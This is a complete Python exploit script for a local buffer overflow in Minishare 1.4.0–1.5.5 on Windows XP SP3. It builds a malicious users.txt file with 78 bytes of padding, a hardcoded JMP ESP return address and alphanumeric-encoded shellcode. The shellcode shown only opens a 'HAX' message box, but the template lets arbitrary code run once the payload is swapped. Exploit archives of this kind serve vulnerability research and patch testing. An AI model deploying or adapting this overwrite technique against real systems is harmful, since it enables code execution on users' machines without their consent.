# Exploit Title: Minishare 1.5.5 Buffer Overflow Vulnerability (users.txt)
# Date: 11/02/2010
# Author: Chris Gabriel
# Software Link: http://sourceforge.net/projects/minishare
# Version: 1.4.0 - 1.5.5
# Tested on: Windows XP SP3 EN
# CVE: 

# MessageBoxA TITLE=HAX TEXT=HAX WIN XP SP3 Shellcode
# \xbb\x48\x41\x58\x00\x53\x89\xe6\x31\xc0\x50\x56\x56\x50
# \xb8\xea\x07\x45\x7e\xff\xd0

# msfencoded MessageBoxA shellcode
# [*] x86/shikata_ga_nai succeeded with size 48 (iteration=1)
# \x33\xc9\xb1\x06\xda\xd2\xd9\x74\x24\xf4\x5b\xb8\x1f\xf9
# \xf2\x17\x83\xeb\xfc\x31\x43\x10\x03\x43\x0f\x1b\x07\xac
# \x67\x9a\xb0\xd3\x24\x95\xa7\xe5\x0a\xf5\x71\x50\xda\x4e
# \x97\x5b\x9f\xd0\x97\xb4

# ALPHA3.py x86 ascii uppercase ESP --input="shellcode-encoded"
# alpha3 encoded ascii uppercase MessageBoxA Shellcode
shellcode = (
"TYVTX10X41PZ41H4A4H1TA91TAFVTZ32PZNBFZDQE02D"
"QF0D13DJE1F4847029R9VNN0D668M194A0I5G5L2G3W3"
"M3Z19LN2A2Z1G0N2K0N4YK0JO9L9Q1S36403F0G3V2K1"
"Q9S123I1Y3N9R8M4E0G"
)

# 78 bytes till EIP
# 82 bytes till ESP
# 304 for payload
# EIP OVERWRITE
buff = "A" * 78
buff += "\x4b\x49\x48\x7e" #7E48494B JMP ESP in user32.dll win xp sp3
buff += shellcode

try:
 	f = open("users.txt",'w')
	f.write(buff)
	f.close()
	print "[+] Vulnerable file created!  Place the 'users.txt' file in the Minishare directory and run the program...\n" 
except:
	print "[-] Error occured!" 